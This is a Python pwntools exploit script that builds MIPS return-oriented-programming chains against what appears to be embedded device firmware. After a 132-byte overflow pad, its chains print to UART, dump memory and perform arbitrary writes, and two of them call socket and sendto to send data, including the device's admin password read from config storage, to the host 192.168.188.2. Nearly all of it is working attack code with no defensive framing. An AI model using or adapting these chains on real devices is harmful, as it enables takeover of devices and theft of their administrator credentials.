from pwn import *

base_address = 0x80000400

# Useful addresses

# Used at address 0x8015b398 in connect call so should work
sockfd_addr = 0x802ab9c0 - 0x10
sockaddr_addr = 0x802ab9c0 - 0x40
pwd_buffer = 0x801d3754

# for our sockaddr struct as we cant send null bytes
harcdoded_afinet = 0x800f9528 # port 4900

# Function address
sendto_addr = 0x80128bc4
socket_addr = 0x801293d0
sleep_addr = 0x8019abac
connect_addr = 0x80129028
strlen_addr = 0x801a717c
reboot_addr = 0x8000538c
config_get_addr = 0x800089e4

def rop_uart_hello():
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0x801d3754) # s0 ('hello')
    chain += p32(0x801c3f91) # s1 ("%s")
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x12ba10 + base_address) # ra
    
    # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x187a30 + base_address) # ra

    # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += b'a'*4
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0x57864 + base_address)

    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(0x8019a3a0) # v0 - printf address
    chain += b'a' * 8
    chain += p32(0x15114 + base_address) # ra

    # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'a' * 4
    chain += p32(0xdecea5ed) # ra

    return chain

def rop_udp_hello():
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x11e670 + base_address) # ra

    ####################################################################
    ########## int socket(int domain, int type, int protocol); #########
    ####################################################################

    # Set first argument for socket to 2
    # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += b'b'*4
    chain += p32(0x172e0c + base_address) # ra

    # Set second argument for socket to 2 
    # 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
    chain += b'b' * 0xc
    chain += p32(0x115428 + base_address)

    # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x6d42c + base_address)

    # set third argument for socket to 0
    # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 4
    chain += p32(0x57864 + base_address) # ra

    # Load address of socket into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(socket_addr) # v0 - socket address
    chain += b'b' * 8
    chain += p32(0x133d58 + base_address) # ra

    # Call socket(2, 2, 0) and regain control
    # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
    chain += b'b' * 0x18
    chain += p32(0xdecea5ed) # s0
    chain += p32(sockaddr_addr) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0x1746c8 + base_address) # ra

    ##########################################################################################################################################
    ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
    ##########################################################################################################################################

    # Move sockfd to a0 for connect
    # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x11e568 + base_address) # ra

    # Move 'hello' into a1 (clobbers v0 but thats fine)
    # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
    chain += p32(0x801d3754) # a1 (address of hello)
    chain += b'b' * 0x8
    chain += p32(0x100790 + base_address)

    # Set a2 to be the length of the string 'hello\0' 
    # 0x00100790: addiu $a2, $zero, 6; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 0x4
    chain += p32(0xbb6e4 + base_address)        

    # Set a3 to be zero (flags)
    # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += b'b' * 0xc
    chain += p32(0x57864 + base_address)

    ## Set up sockaddr struct

    # s1 has our sockaddr address, load address of afinet into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += p32(harcdoded_afinet) # v0
    chain += b'b' * 8
    chain += p32(0x1a46dc + base_address)

    # Load hardcoded afinet stuff into v0 (currently has the address)
    # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0x13e134 + base_address)

    # Store the afinet stuff at our sockaddr struct
    # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
    chain += b'b' * 4
    chain += p32(0xdecea5ed) # s0
    chain += p32(sockaddr_addr + 4) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x57864 + base_address) # ra

    # Load the IP address into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
    chain += b'b' * 8
    chain += p32(0x13e134 + base_address) # ra

    # Store the loaded IP address at sockaddr + 4
    # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
    chain += b'b' * 4
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x57864 + base_address) # ra

    ## Load t0 value into v0
    # Load v0 from stack
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(sockaddr_addr) # v0 - sockaddr address
    chain += b'b' * 8
    chain += p32(0x15d20c + base_address) # ra

    # Move sockaddr from v0 into t0 (load v0 from stack, move into t0) #########Might need fixing need to check addresses!!!###########
    # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
    #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
    chain += b'b' * 0xc
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0xdecea5ed) # s4
    chain += p32(0xdecea5ed) # s5
    chain += p32(0xdecea5ed) # s6
    chain += p32(0xdecea5ed) # s7
    chain += p32(0x1895cc + base_address) # ra

    # Move 0x20 into t1
    # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
    chain += b'b' * 0x20
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0x57864 + base_address) # ra

    # Load address of sendto into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(sendto_addr) # v0 - sendto address
    chain += b'b' * 8
    chain += p32(0x15114 + base_address) # ra

    # Call sendto and regain control
    # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0xdecea5ed)
    
    return chain

def rop_uart_admin():
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0x80236c4c - 4) # s0 (0x1010200)
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x153d0 + base_address) # ra

    ###############################################
    ############## config function ################
    ###############################################

    # set a0 to be the id of the admin password
    # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += p32(config_get_addr + 0x7b58) # s0
    chain += p32(0x11e568 + base_address)

    # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(pwd_buffer)
    chain += b'b' * 0x8
    chain += p32(0x137960 + base_address)

    ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
    # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x15114 + base_address) # ra

    ## Now call config load
    # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 0x4
    chain += p32(0x13478 + base_address) # ra

    ##################################################
    ############## print admin password ##############
    ##################################################

    # 0x00013478: lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += b'b' * 4
    chain += p32(pwd_buffer) # s0 ('on')
    chain += p32(0x801c3f91) # s1 ("%s")
    chain += p32(0x12ba10 + base_address) # ra
    
    # 0x0012ba10: move $a1, $s0; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x187a30 + base_address) # ra

    # 0x00187a30: move $a0, $s1; lw $ra, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += b'a'*4
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0x57864 + base_address)

    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(0x8019a3a0) # v0 - printf address
    chain += b'a' * 8
    chain += p32(0x15114 + base_address) # ra

    # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'a' * 4
    chain += p32(0xdecea5ed) # ra
    
    return chain

def rop_udp_admin():
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x11e670 + base_address) # ra

    ####################################################################
    ########## int socket(int domain, int type, int protocol); #########
    ####################################################################

    # Set first argument for socket to 2
    # 0x0011e670: addiu $a0, $zero, 2; lw $ra, 4($sp); move $v0, $zero; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += b'b'*4
    chain += p32(0x172e0c + base_address) # ra

    # Set second argument for socket to 2 
    # 0x00172e0c: move $a1, $zero; lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
    chain += b'b' * 0xc
    chain += p32(0x115428 + base_address)

    # 0x00115428: addiu $a1, $a1, 2; lw $ra, 4($sp); move $v0, $s0; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x6d42c + base_address)

    # set third argument for socket to 0
    # 0x0006d42c: move $a2, $zero; lw $ra, 4($sp); addiu $v0, $zero, 1; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 4
    chain += p32(0x57864 + base_address) # ra

    # Load address of socket into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(socket_addr) # v0 - socket address
    chain += b'b' * 8
    chain += p32(0x133d58 + base_address) # ra

    # Call socket(2, 1, 0) and regain control
    # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
    chain += b'b' * 0x18
    chain += p32(sockfd_addr) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0x185e38 + base_address) # ra

    # save the socket file descriptor for use later, might not use but oh well
    # 0x00185e38: sw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0x80236c4c - 4) # s0 (0x1010200 address)
    chain += p32(0x153d0 + base_address) # ra

    ####################################################
    ############## config load function ################
    ####################################################

    # Set a0 to be the id of the admin password
    # 0x000153d0: lw $a0, 4($s0); lw $ra, 4($sp); addiu $v0, $zero, 2; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += p32(config_get_addr + 0x7b58) # s0
    chain += p32(0x11e568 + base_address)

    # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(pwd_buffer)
    chain += b'b' * 0x8
    chain += p32(0x137960 + base_address)

    ## The address of config load contains a null byte, so we will have to do some subtracting (s0 is set to address of function + 0x7b58)
    # 0x00137960: addiu $v0, $s0, -0x7b58; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x15114 + base_address) # ra

    ## Now call config load
    # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 0x4
    chain += p32(0x19bc70 + base_address) # ra

    ##############################################
    ############### strlen (str) #################
    ##############################################

    # Regain control of s0
    # 0x0019bc70: lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(pwd_buffer) # s0
    chain += p32(0xb018c + base_address) # ra

    # Move pwd buffer address into a0
    # 0x000b018c: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x57864 + base_address) # ra

    # call strlen on the password buffer 

    # Load address of strlen into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(strlen_addr) # v0 - strlen address
    chain += b'b' * 8
    chain += p32(0x133d58 + base_address) # ra

    # Call strlen and regain control
    # 0x00133d58: jalr $v0; nop; move $s0, $v0; lw $ra, 0x24($sp); move $v0, $s0; lw $s2, 0x20($sp); lw $s1, 0x1c($sp); lw $s0, 0x18($sp); jr $ra; addiu $sp, $sp, 0x28; 
    chain += b'b' * 0x18
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0x166168 + base_address) # ra

    # 0x00166168: move $v1, $v0; lw $ra, 4($sp); move $v0, $v1; lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0x18f044 + base_address)

    # 0x0018f044: move $a2, $v1; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += b'b' * 0xc
    chain += p32(0x1a9f9c + base_address)

    ##########################################################################################################################################
    ####### ssize_t sendto(int sockfd, const void *buf, size_t len, int flags, const struct sockaddr *dest_addr, socklen_t addrlen); #########
    ##########################################################################################################################################

    # Load sockfd address into v0
    # 0x001a9f9c: lw $v0, ($sp); lw $ra, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x18;
    chain += p32(sockfd_addr) # v0
    chain += b'b' * 8
    chain += p32(0xdecea5ed) # s0
    chain += p32(sockaddr_addr) # s1
    chain += p32(0x1a46dc + base_address) # ra

    # Load sockfd value into v0
    # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0x1746c8 + base_address)

    # Move sockfd to a0 for connect
    # 0x001746c8: move $a0, $v0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x11e568 + base_address) # ra

    # Move admin pwd into a1
    # 0x0011e568: lw $a1, ($sp); lw $ra, 0xc($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 0x10; 
    chain += p32(pwd_buffer) # a1 (address of admin pwd)
    chain += b'b' * 0x8
    chain += p32(0xbb6e4 + base_address) # ra

    # Set a3 to be zero (flags)
    # 0x000bb6e4: move $a3, $zero; lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += b'b' * 0xc
    chain += p32(0x57864 + base_address) # ra

    ## Set up sockaddr struct

    # s1 has our sockaddr address, load address of afinet into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += p32(harcdoded_afinet) # v0
    chain += b'b' * 8
    chain += p32(0x1a46dc + base_address) # ra

    # Load hardcoded afinet stuff into v0 (currently has the address)
    # 0x001a46dc: lw $v0, ($v0); lw $ra, 4($sp); jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0x13e134 + base_address) # ra

    # Store the afinet stuff at our sockaddr struct
    # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18; 
    chain += b'b' * 4
    chain += p32(0xdecea5ed) # s0
    chain += p32(sockaddr_addr + 4) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x57864 + base_address) # ra

    # Load the IP address into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10; 
    chain += struct.pack('>BBBB', 192, 168, 188, 2) # v0, IP
    chain += b'b' * 8
    chain += p32(0x13e134 + base_address) # ra

    # Store the loaded IP address at sockaddr + 4
    # 0x0013e134: sw $v0, ($s1); lw $ra, 0x14($sp); lw $s3, 0x10($sp); lw $s2, 0xc($sp); lw $s1, 8($sp); lw $s0, 4($sp); jr $ra; addiu $sp, $sp, 0x18;
    chain += b'b' * 4
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0x57864 + base_address) # ra

    ## Load t0 value into v0
    # Load v0 from stack
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(sockaddr_addr) # v0 - sockaddr address
    chain += b'b' * 8
    chain += p32(0x15d20c + base_address) # ra

    # Move sockaddr from v0 into t0 (load v0 from stack, move into t0)
    # 0x0015d20c: move $t0, $v0; lw $ra, 0x2c($sp); addiu $s0, $zero, 0x163; move $v0, $s0; lw $s7, 0x28($sp); lw $s6, 0x24($sp); 
    #   lw $s5, 0x20($sp); lw $s4, 0x1c($sp); lw $s3, 0x18($sp); lw $s2, 0x14($sp); lw $s1, 0x10($sp); lw $s0, 0xc($sp); jr $ra; addiu $sp, $sp, 0x30; 
    chain += b'b' * 0xc
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0xdecea5ed) # s4
    chain += p32(0xdecea5ed) # s5
    chain += p32(0xdecea5ed) # s6
    chain += p32(0xdecea5ed) # s7
    chain += p32(0x1895cc + base_address) # ra

    # Move 0x20 into t1
    # 0x001895cc: addiu $t1, $zero, 0x20; lw $ra, 0x2c($sp); lw $s2, 0x28($sp); lw $s1, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x30;
    chain += b'b' * 0x20
    chain += p32(0xdecea5ed) # s0
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0x57864 + base_address) # ra

    # Load address of sendto into v0
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(sendto_addr) # v0 - sendto address
    chain += b'b' * 8
    chain += p32(0x15114 + base_address) # ra

    # Call sendto and regain control
    # 0x15114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8; 
    chain += b'b' * 4
    chain += p32(0xdecea5ed) # ra
    
    return chain

def rop_hexdump_memory():
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0x801d3754) # s0 (address to read) - currently sp
    chain += p32(0xdecea5ed) # s1
    chain += p32(0xdecea5ed) # s2
    chain += p32(0xdecea5ed) # s3
    chain += p32(0xb0228 + base_address) # ra

    # Move address into a0
    # 0x000b0228: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
    chain += p32(0xdecea5ed) # s0
    chain += p32(0x71b68 + base_address) # ra

    # 0x00071b68: addiu $a1, $zero, 0x8bf; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 4
    chain += p32(0x57864 + base_address) # ra

    # Load and call hexdump
    # 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(0x8019966c) # v0 - hexdump address
    chain += b'b' * 8
    chain += p32(0x15114 + base_address) # ra

    # 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
    chain += b'b' * 4
    chain += p32(0x8019b118) # ra
    
    return chain

def rop_demo_non_crash():
    '''
    - just s0 : crash, pc = 801888e0
        Except 5: AdES
            z0=00000000 at=fffffffe v0=00000000 v1=00000041
            a0=801f0000 a1=8025d521 a2=801ec064 a3=00000000
            t0=80260000 t1=01010101 t2=00000001 t3=000000df
            t4=0000000a t5=0000000d t6=802c5390 t7=00000020
            s0=11111111 s1=8025d500 s2=802c5268 s3=802ab9f4
            s4=801ef724 s5=11110015 s6=11110016 s7=11110017
            t8=802b5a00 t9=00000006 k0=00000000 k1=00000000
            gp=80269a60 sp=802ab9c0 fp=802aba20 ra=801888e0
            pc=801888e0 sr=1000e403 cause=80000014, badva=1111116d

    - Expected values of overwritten registers (found via trial and error):
        - s0 : 0x802c0004
        - s1 : 0x8025d500
        - s2 : 0x802C5268
        - s3 : 0x802ab9f4
        - ra : 0x801888e0
    '''

    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(0x802c0404) # s0
    chain += p32(0x8025d504) # s1
    chain += p32(0x802C5268) # s2
    chain += p32(0x802ab9f4) # s3
    chain += p32(0x801888e0) # ra
    
    return chain

def rop_arbitrary_write(addr, value):
    chain = b'a' * 132

    # Add the strings to the sX registers, and set the ra to first gadget
    chain += p32(value) # s0
    chain += p32(addr) # s1
    chain += p32(0x802C5268) # s2
    chain += p32(0x802ab9f4) # s3
    chain += p32(0x8013be14) # ra

    # 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    chain += p32(0x802c0404) # s0
    chain += p32(0x8025d504) # s1
    chain += p32(0x802C5268) # s2
    chain += p32(0x801888e8) # ra

    return chain